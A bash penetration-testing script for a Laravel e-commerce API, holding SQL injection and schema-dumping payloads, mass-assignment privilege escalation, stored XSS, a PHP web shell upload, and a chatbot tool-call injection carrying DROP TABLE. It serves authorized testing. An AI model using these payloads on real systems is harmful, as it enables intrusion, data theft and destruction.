#!/bin/bash

# Security Testing Script for Laravel E-commerce Application
# Usage: ./security_test_commands.sh [BASE_URL]
# Example: ./security_test_commands.sh https://your-app.com

BASE_URL=${1:-"http://localhost"}
echo "Testing application at: $BASE_URL"
echo "=================================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}1. Testing SQL Injection in FAQ Search${NC}"
echo "Testing basic SQL injection..."
curl -s -X GET "$BASE_URL/api/faqs/test-team?query=' UNION SELECT 1,database(),user(),version(),5 -- " \
  -H "Accept: application/json" | jq '.' 2>/dev/null || echo "Response received"

echo -e "\n${YELLOW}2. Testing Mass Assignment in Customer Creation${NC}"
echo "Attempting to create customer with admin privileges..."
curl -s -X POST "$BASE_URL/api/customers" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{
    "name": "Hacker User",
    "email": "hacker@evil.com",
    "phone": "+1234567890",
    "role": "admin",
    "team_id": 999,
    "is_admin": true,
    "status": "premium"
  }' | jq '.' 2>/dev/null || echo "Response received"

echo -e "\n${YELLOW}3. Testing Mass Assignment in Order Creation${NC}"
echo "Attempting to create order with manipulated fields..."
curl -s -X POST "$BASE_URL/api/order/test-team" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{
    "delivery_date": "2025-01-01",
    "user_phone": "+1234567890",
    "product_ids": [1, 2],
    "team_id": 999,
    "status": "completed",
    "total_price": 0.01,
    "is_paid": true
  }' | jq '.' 2>/dev/null || echo "Response received"

echo -e "\n${YELLOW}4. Testing SQL Injection with Information Schema${NC}"
echo "Attempting to extract database schema..."
curl -s -X GET "$BASE_URL/api/faqs/test-team" \
  --data-urlencode "query=') UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 10 -- " \
  -H "Accept: application/json" | jq '.' 2>/dev/null || echo "Response received"

echo -e "\n${YELLOW}5. Testing Chatbot Function Injection${NC}"
echo "Testing AI function call parameter injection..."
curl -s -X POST "$BASE_URL/api/chatbot" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{
    "message": "Get products with names: [\"; DROP TABLE products; --\", \"test\"]",
    "team": "test-team",
    "thread_id": "test-thread-123",
    "uuid": "test-uuid-456",
    "locale": "it"
  }' | jq '.' 2>/dev/null || echo "Response received"

echo -e "\n${YELLOW}6. Testing Authentication Bypass${NC}"
echo "Attempting to access protected endpoint without authentication..."
curl -s -X GET "$BASE_URL/api/gantt-data" \
  -H "Accept: application/json" \
  -H "Authorization: Bearer fake-token" | jq '.' 2>/dev/null || echo "Response received"

echo -e "\n${YELLOW}7. Testing XSS in Customer Data${NC}"
echo "Testing stored XSS through customer creation..."
curl -s -X POST "$BASE_URL/api/customers" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{
    "name": "<script>alert(\"XSS\")</script>",
    "email": "<img src=x onerror=alert(\"XSS\")>@test.com",
    "phone": "+1234567890"
  }' | jq '.' 2>/dev/null || echo "Response received"

echo -e "\n${YELLOW}8. Testing Error Information Disclosure${NC}"
echo "Testing for verbose error messages..."
curl -s -X GET "$BASE_URL/api/nonexistent-endpoint/with/invalid/parameters" \
  -H "Accept: application/json" | jq '.' 2>/dev/null || echo "Response received"

echo -e "\n${YELLOW}9. Testing CORS Policy${NC}"
echo "Testing CORS configuration..."
curl -s -X OPTIONS "$BASE_URL/api/customers" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -v 2>&1 | grep -i "access-control"

echo -e "\n${YELLOW}10. Testing File Upload Vulnerability${NC}"
echo "Creating malicious PHP file..."
echo '<?php system($_GET["cmd"]); ?>' > /tmp/malicious.php

echo "Testing file upload..."
curl -s -X POST "$BASE_URL/api/upload-file" \
  -H "Accept: application/json" \
  -F "file=@/tmp/malicious.php" \
  -F "message=Testing file upload" \
  -F "locale=it" | jq '.' 2>/dev/null || echo "Response received"

# Cleanup
rm -f /tmp/malicious.php

echo -e "\n${GREEN}Testing completed!${NC}"
echo -e "${RED}WARNING: This script is for authorized security testing only.${NC}"
echo -e "${RED}Do not use against systems you don't own or have permission to test.${NC}"